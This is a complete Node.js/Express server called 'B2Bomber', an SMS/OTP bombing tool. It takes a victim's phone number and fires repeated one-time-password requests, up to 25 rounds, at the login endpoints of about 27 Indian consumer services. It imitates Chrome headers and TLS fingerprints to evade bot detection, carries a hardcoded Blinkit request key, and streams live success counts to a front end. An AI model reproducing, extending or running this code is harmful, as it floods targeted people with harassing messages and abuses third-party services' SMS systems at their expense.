/* =====================================================================
 *  B2Bomber — server.js  [FIXED v3]
 *  v3: round-major scheduling (result turant), dead-skip,
 *      /api/selftest, browser-like headers, hard timeout.
 * ===================================================================== */

import express from 'express';
import path from 'node:path';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');

process.on('uncaughtException', (e) => console.error('[uncaught]', e));
process.on('unhandledRejection', (e) => console.error('[unhandled]', e));

/* impit optional — na mile to native fetch */
let impit = null;
try {
  const mod = await import('impit');
  const Impit = mod.Impit || mod.default;
  if (Impit) impit = new Impit({ browser: 'chrome' });
  console.log('[ok] impit loaded');
} catch (e) {
  console.log('[warn] impit nahi mila, native fetch use hoga:', e.message);
}

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
         + '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

/* ------------------------------- CONFIG ------------------------------- */
const PORT        = process.env.PORT || 3000;
const TIMEOUT_MS  = Number(process.env.TIMEOUT_MS || 7000);
const CONC        = Number(process.env.CONC || 12);
const BENCH_AFTER = 3;
const BENCH_MS    = 10 * 60 * 1000;

/* ------------------------------ HELPERS ------------------------------- */
const FORM  = { 'Content-Type': 'application/x-www-form-urlencoded' };
const JSONH = { 'Content-Type': 'application/json' };
const qs    = (o) => new URLSearchParams(o).toString();

const CH_UA = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"';

function hdr(origin, extra) {
  return {
    'User-Agent': UA,
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-IN,en-GB;q=0.9,en;q=0.8',
    'sec-ch-ua': CH_UA,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'Origin': origin,
    'Referer': origin + '/',
    ...extra,
  };
}

function normalize(raw) {
  let d = String(raw || '').replace(/\D/g, '');
  if (d.startsWith('00')) d = d.slice(2);
  if (d.length === 12 && d.startsWith('91')) d = d.slice(2);
  if (d.length === 11 && d.startsWith('0'))  d = d.slice(1);
  return { ten: d, cc: '91' + d, plus: '+91' + d };
}

const benchWorthy = (s) => s === 0 || s === 404 || s >= 500;

/* HARD timeout — impit signal ignore kare to bhi chale */
function withTimeout(p, ctrl, ms) {
  let t;
  const killer = new Promise((_, rej) => {
    t = setTimeout(() => {
      try { ctrl.abort(); } catch (_) {}
      rej(new Error('timeout ' + ms + 'ms'));
    }, ms);
  });
  return Promise.race([p, killer]).finally(() => clearTimeout(t));
}

async function request(url, opts = {}) {
  const { method = 'GET', headers = {}, body, redirect = 'follow' } = opts;
  const ctrl = new AbortController();
  const init = { method, headers, body, redirect, signal: ctrl.signal };

  const r = impit
    ? await withTimeout(impit.fetch(url, init), ctrl, TIMEOUT_MS)
    : await withTimeout(fetch(url, init), ctrl, TIMEOUT_MS);

  const text = await withTimeout(r.text(), ctrl, TIMEOUT_MS);
  return { status: r.status, ok: r.ok, text };
}

async function tryAll(attempts) {
  let last = { status: 0, text: '', error: 'no attempt' };
  for (const a of attempts) {
    try {
      const r = await request(a.url, a);
      last = r;
      if (!benchWorthy(r.status)) return r;
    } catch (e) {
      last = { status: 0, text: '', error: String(e.message || e) };
    }
  }
  return last;
}

/* --------------------------- BENCH (auto-skip) ------------------------ */
const benchState = new Map();
function markFail(id) {
  const b = benchState.get(id) || { fails: 0, until: 0 };
  b.fails++;
  if (b.fails >= BENCH_AFTER) b.until = Date.now() + BENCH_MS;
  benchState.set(id, b);
}
function markOk(id) { benchState.set(id, { fails: 0, until: 0 }); }
function isBenched(id) {
  const b = benchState.get(id);
  return !!(b && b.until > Date.now());
}

/* ---------------------- LIVE STATS (UI ke liye) ----------------------- */
const live = new Map();
function L(id) {
  if (!live.has(id)) live.set(id, { sent: 0, ok: 0, failed: 0, lastStatus: null, lastMs: null, lastAt: null });
  return live.get(id);
}

/* =====================================================================
 *  SERVICES — naya add karna ho to template:
 *  { id:'merasite', name:'Mera Site', attempts: (p) => [
 *      { url:'https://merasite.com/api/otp', method:'POST',
 *        headers: hdr('https://merasite.com', FORM), body: qs({ mobile: p.ten }) } ] },
 * ===================================================================== */

const BLINKIT_REQ_KEY = 'c0e6868e-1180-400c-be51-f473479f1f0a';
let blinkitCache = { key: null, at: 0 };

async function blinkitAuth() {
  if (blinkitCache.key && Date.now() - blinkitCache.at < 25 * 60 * 1000) return blinkitCache.key;
  const r = await request('https://blinkit.com/v2/accounts/auth_key/', {
    headers: hdr('https://blinkit.com', { req_key: BLINKIT_REQ_KEY }),
  });
  let key = null;
  try { key = JSON.parse(r.text).auth_key; } catch (_) {}
  if (!key) throw new Error('blinkit auth_key nahi mila (status ' + r.status + ')');
  blinkitCache = { key, at: Date.now() };
  return key;
}

const SERVICES = [
  /* ------------------------- VERIFIED ------------------------- */
  { id: 'blinkit', name: 'Blinkit', verified: true,
    send: async (p, ctx) => {
      const key = ctx.blinkitKey || (ctx.blinkitKey = await blinkitAuth());
      return request('https://blinkit.com/v2/accounts/', {
        method: 'POST',
        headers: hdr('https://blinkit.com', { ...FORM, req_key: BLINKIT_REQ_KEY, auth_key: key, device_id: 'web' }),
        body: qs({ user_phone: p.plus }),
      });
    } },
  { id: 'nykaa', name: 'Nykaa', verified: true,
    attempts: (p) => [
      { url: 'https://www.nykaa.com/api/index.php/customer/send_otp', method: 'POST',
        headers: hdr('https://www.nykaa.com', FORM), body: qs({ mobile_number: p.ten, platform: 'web' }) },
      { url: 'https://www.nykaa.com/appapi/index.php/customer/send_otp', method: 'POST',
        headers: hdr('https://www.nykaa.com', FORM), body: qs({ mobile_number: p.ten, platform: 'web' }) },
    ] },
  { id: 'redbus', name: 'RedBus', verified: true,
    attempts: (p) => [
      { url: 'https://www.redbus.in/rpw/api/sendOtpV2', method: 'POST',
        headers: hdr('https://www.redbus.in', JSONH), body: JSON.stringify({ phone: p.ten, reCaptchaResponse: '' }) },
      { url: 'https://www.redbus.in/rpw/api/sendOtpV2', method: 'POST',
        headers: hdr('https://www.redbus.in', JSONH), body: JSON.stringify({ phone: p.cc, reCaptchaResponse: '' }) },
    ] },

  /* ------------------------ BEST EFFORT ------------------------ */
  { id: 'zomato', name: 'Zomato', attempts: (p) => [
      { url: 'https://www.zomato.com/php/otp.php', method: 'POST',
        headers: hdr('https://www.zomato.com', FORM), body: qs({ mobile_number: p.ten }) },
      { url: 'https://www.zomato.com/php/o2_api_v2/otp/send', method: 'POST',
        headers: hdr('https://www.zomato.com', FORM), body: qs({ mobile_number: p.ten }) } ] },
  { id: 'swiggy', name: 'Swiggy', attempts: (p) => [
      { url: 'https://www.swiggy.com/api/mobile-auth/otp', method: 'POST',
        headers: hdr('https://www.swiggy.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'myntra', name: 'Myntra', attempts: (p) => [
      { url: 'https://www.myntra.com/gateway/v2/user/otp/generate', method: 'POST',
        headers: hdr('https://www.myntra.com', FORM), body: qs({ mobile: p.ten }) } ] },
  { id: 'flipkart', name: 'Flipkart', attempts: (p) => [
      { url: 'https://www.flipkart.com/api/5/user/otp/generate', method: 'POST',
        headers: hdr('https://www.flipkart.com', JSONH), body: JSON.stringify({ phone: p.ten }) } ] },
  { id: 'snapdeal', name: 'Snapdeal', attempts: (p) => [
      { url: 'https://www.snapdeal.com/sendOTP', method: 'POST',
        headers: hdr('https://www.snapdeal.com', FORM), body: qs({ mobileNumber: p.ten }) },
      { url: 'https://www.snapdeal.com/sendOTP?' + qs({ mobileNumber: p.ten }), method: 'GET',
        headers: hdr('https://www.snapdeal.com') } ] },
  { id: 'mobikwik', name: 'MobiKwik', attempts: (p) => [
      { url: 'https://appapi.mobikwik.com/p/account/otp/cell', method: 'POST',
        headers: hdr('https://www.mobikwik.com', JSONH), body: JSON.stringify({ cell: p.cc }) } ] },
  { id: 'treebo', name: 'Treebo', attempts: (p) => [
      { url: 'https://www.treebo.com/api/v2/auth/login/otp/', method: 'POST',
        headers: hdr('https://www.treebo.com', JSONH), body: JSON.stringify({ phone: p.cc }) } ] },
  { id: 'goibibo', name: 'Goibibo', attempts: (p) => [
      { url: 'https://www.goibibo.com/common/downloadsms/?' + qs({ phone: p.ten, countryCode: '91' }),
        method: 'GET', headers: hdr('https://www.goibibo.com') } ] },
  { id: 'sulekha', name: 'Sulekha', attempts: (p) => [
      { url: 'https://myaccount.sulekha.com/network/userauthv1.aspx', method: 'POST',
        headers: hdr('https://myaccount.sulekha.com', FORM), body: qs({ mobile: p.ten }) } ] },
  { id: 'justdial', name: 'Justdial', attempts: (p) => [
      { url: 'https://www.justdial.com/functions/ajxandroid.php', method: 'POST',
        headers: hdr('https://www.justdial.com', FORM), body: qs({ mobile: p.ten }) } ] },
  { id: 'lenskart', name: 'Lenskart', attempts: (p) => [
      { url: 'https://www.lenskart.com/api/v1/send-otp', method: 'POST',
        headers: hdr('https://www.lenskart.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'oyo', name: 'OYO', attempts: (p) => [
      { url: 'https://www.oyorooms.com/api/v1/user/otp', method: 'POST',
        headers: hdr('https://www.oyorooms.com', JSONH), body: JSON.stringify({ phone: p.cc }) } ] },
  { id: 'bigbasket', name: 'BigBasket', attempts: (p) => [
      { url: 'https://www.bigbasket.com/api/v1/user/otp', method: 'POST',
        headers: hdr('https://www.bigbasket.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'pharmeasy', name: 'PharmEasy', attempts: (p) => [
      { url: 'https://pharmeasy.in/api/v1/otp/send', method: 'POST',
        headers: hdr('https://pharmeasy.in', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'vedantu', name: 'Vedantu', attempts: (p) => [
      { url: 'https://www.vedantu.com/api/v1/otp/send', method: 'POST',
        headers: hdr('https://www.vedantu.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'bewakoof', name: 'Bewakoof', attempts: (p) => [
      { url: 'https://www.bewakoof.com/api/v1/user/otp', method: 'POST',
        headers: hdr('https://www.bewakoof.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'purplle', name: 'Purplle', attempts: (p) => [
      { url: 'https://www.purplle.com/api/v1/sendOtp', method: 'POST',
        headers: hdr('https://www.purplle.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'makemytrip', name: 'MakeMyTrip', attempts: (p) => [
      { url: 'https://www.makemytrip.com/api/v1/otp/send', method: 'POST',
        headers: hdr('https://www.makemytrip.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'airtel', name: 'Airtel', attempts: (p) => [
      { url: 'https://www.airtel.in/api/v1/otp', method: 'POST',
        headers: hdr('https://www.airtel.in', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'cred', name: 'CRED', attempts: (p) => [
      { url: 'https://api.cred.com/otp/send', method: 'POST',
        headers: hdr('https://cred.club', JSONH), body: JSON.stringify({ phone: p.cc }) } ] },
  { id: 'zepto', name: 'Zepto', attempts: (p) => [
      { url: 'https://www.zeptonow.com/api/v1/otp/send', method: 'POST',
        headers: hdr('https://www.zeptonow.com', JSONH), body: JSON.stringify({ mobile: p.ten }) } ] },
  { id: 'nykaafashion', name: 'Nykaa Fashion', attempts: (p) => [
      { url: 'https://www.nykaafashion.com/api/index.php/customer/send_otp', method: 'POST',
        headers: hdr('https://www.nykaafashion.com', FORM), body: qs({ mobile_number: p.ten }) } ] },
];

/* ============================== SERVER ================================ */
const app = express();
app.use(express.json({ limit: '256kb' }));

const STATIC_DIRS = [path.join(__dirname, 'public'), path.join(ROOT, 'public'), __dirname, ROOT];
for (const d of STATIC_DIRS) {
  try { if (fs.existsSync(d)) app.use(express.static(d)); } catch (_) {}
}

app.get('/', (_req, res) => {
  for (const d of STATIC_DIRS) {
    const f = path.join(d, 'index.html');
    if (fs.existsSync(f)) return res.sendFile(f);
  }
  res.type('html').send('<h1>B2Bomber API live</h1><p>/api/services</p>');
});

app.get('/api/health', (_req, res) => {
  const benched = SERVICES.filter(s => isBenched(s.id)).length;
  res.json({
    ok: true, impit: !!impit, up: Math.round(process.uptime()),
    services: SERVICES.length, live: SERVICES.length - benched, benched,
  });
});

app.post('/api/stats/reset', (_req, res) => {
  benchState.clear(); live.clear();
  res.json({ ok: true });
});

app.get('/api/services', (_req, res) => {
  res.json(SERVICES.map(s => ({
    id: s.id, name: s.name, verified: !!s.verified, benched: isBenched(s.id), ...L(s.id),
  })));
});

app.get('/api/stats', (_req, res) => {
  res.json(SERVICES.map(s => ({ id: s.id, name: s.name, ...L(s.id) })));
});

/* ---------- DIAGNOSTIC: ek service ko live test karo ---------- */
app.get('/api/test/:id', async (req, res) => {
  const svc = SERVICES.find(s => s.id === req.params.id);
  if (!svc) return res.status(404).json({ error: 'service nahi mila' });
  const p = normalize(req.query.number || req.query.phone || '9999999999');
  const t0 = Date.now();
  try {
    const r = svc.send ? await svc.send(p, {}) : await tryAll(svc.attempts(p, {}));
    res.json({ id: svc.id, status: r.status, ok: r.ok, ms: Date.now() - t0,
               body: String(r.text || '').slice(0, 300) });
  } catch (e) {
    res.json({ id: svc.id, status: 0, ok: false, ms: Date.now() - t0, error: String(e.message || e) });
  }
});

/* ---------- DIAGNOSTIC: saare services ek saath test ---------- */
app.get('/api/selftest', async (req, res) => {
  const p = normalize(req.query.number || '9999999999');
  const out = await Promise.all(SERVICES.map(async (svc) => {
    const t0 = Date.now();
    try {
      const r = svc.send ? await svc.send(p, {}) : await tryAll(svc.attempts(p, {}));
      return { id: svc.id, status: r.status, ok: r.status > 0 && r.status < 400, ms: Date.now() - t0 };
    } catch (e) {
      return { id: svc.id, status: 0, ok: false, ms: Date.now() - t0, error: String(e.message || e) };
    }
  }));
  res.json({ impit: !!impit, number: p.ten, up: out.filter(o => o.ok).length, total: out.length, results: out });
});

async function bomb(req, res) {
  const src = Object.assign({}, req.query, req.body || {});
  const p = normalize(src.phone || src.number || '');
  if (!/^\d{10}$/.test(p.ten)) {
    return res.status(400).json({ error: 'Sahi 10-digit mobile number do' });
  }

  const rounds = Math.max(1, Math.min(parseInt(src.rounds || src.repeat || '1', 10) || 1, 25));
  const only   = src.services || src.only;
  const skipDead = !(src.skipDead === false || src.skipDead === 'false');

  let list = (!only || only === 'all')
    ? SERVICES.slice()
    : SERVICES.filter(s => String(only).split(',').includes(s.id));
  list.sort((a, b) => (b.verified ? 1 : 0) - (a.verified ? 1 : 0));

  const skippedIds = skipDead ? list.filter(s => isBenched(s.id)).map(s => s.id) : [];
  if (skipDead) list = list.filter(s => !isBenched(s.id));
  if (!list.length) {
    return res.status(400).json({ error: 'Saare services benched hain — health reset karo' });
  }

  res.setHeader('Content-Type', 'application/x-ndjson; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('X-Accel-Buffering', 'no');
  res.setHeader('Connection', 'keep-alive');
  if (typeof res.flushHeaders === 'function') res.flushHeaders();

  let closed = false;
  req.on('close', () => { closed = true; });
  const w = (o) => { if (!closed) res.write(JSON.stringify(o) + '\n'); };

  const total = list.length * rounds;
  w({ type: 'start', phone: p.ten, services: list.length, repeat: rounds, total, skipped: skippedIds.length });

  const beat = setInterval(() => w({ type: 'ping', t: Date.now() }), 4000);

  /* ROUND-MAJOR: pehle sabhi services ka round 1, phir round 2 ...
     isse pehla result turant aata hai, ek service ke peeche poora wait nahi */
  const tasks = [];
  for (let r = 1; r <= rounds; r++) for (const svc of list) tasks.push({ svc, r });

  const ctx = {};
  const dead = new Set();
  let done = 0, okTotal = 0, failTotal = 0;

  const emit = (svc, round, status, ok, ms, note) => {
    const s = L(svc.id);
    w({
      type: 'result',
      id: svc.id, name: svc.name,
      status, ok, ms, round,
      note: note || '', error: note || '',
      sent: okTotal, failed: failTotal,
      done, total,
      progress: Math.round((done / total) * 100),
      site: { sent: s.sent, ok: s.ok, failed: s.failed },
    });
  };

  const runOne = async (svc, round) => {
    const t0 = Date.now();
    let status = 0, error = null;
    try {
      const r = svc.send ? await svc.send(p, ctx) : await tryAll(svc.attempts(p, ctx));
      status = r.status || 0;
      if (status === 0 && r.error) error = r.error;
      if (benchWorthy(status)) markFail(svc.id); else markOk(svc.id);
    } catch (e) {
      error = String(e.message || e);
      markFail(svc.id);
    }
    const ms = Date.now() - t0;
    const ok = status > 0 && status < 400;
    const s = L(svc.id);
    s.sent++; s.lastStatus = status; s.lastMs = ms; s.lastAt = Date.now();
    if (ok) { s.ok++; okTotal++; } else { s.failed++; failTotal++; }
    done++;

    /* network timeout = mehnga (7s). Pehle round me hi fail hua to baaki
       rounds skip kar do, taaki 250 requests 200 second na lein */
    if (status === 0 && round === 1) dead.add(svc.id);

    emit(svc, round, status, ok, ms, error);
  };

  let i = 0;
  const workers = Array.from({ length: Math.max(1, Math.min(CONC, tasks.length)) }, async () => {
    while (i < tasks.length && !closed) {
      const t = tasks[i++];

      if (dead.has(t.svc.id)) {
        const s = L(t.svc.id);
        s.sent++; s.failed++; failTotal++; done++;
        emit(t.svc, t.r, 0, false, 0, 'skip (round 1 me fail)');
        continue;
      }
      await runOne(t.svc, t.r);
    }
  });
  await Promise.all(workers);

  clearInterval(beat);

  w({
    type: 'done',
    sent: okTotal, failed: failTotal, done, total,
    skipped: skippedIds.length,
    sites: SERVICES.map(s => ({ id: s.id, name: s.name, benched: isBenched(s.id), ...L(s.id) })),
  });
  if (!closed) res.end();
}

app.get('/api/bomb', bomb);
app.post('/api/bomb', bomb);

app.listen(PORT, () => {
  console.log('B2Bomber live -> port ' + PORT + ' | sites: ' + SERVICES.length + ' | impit: ' + !!impit);
});
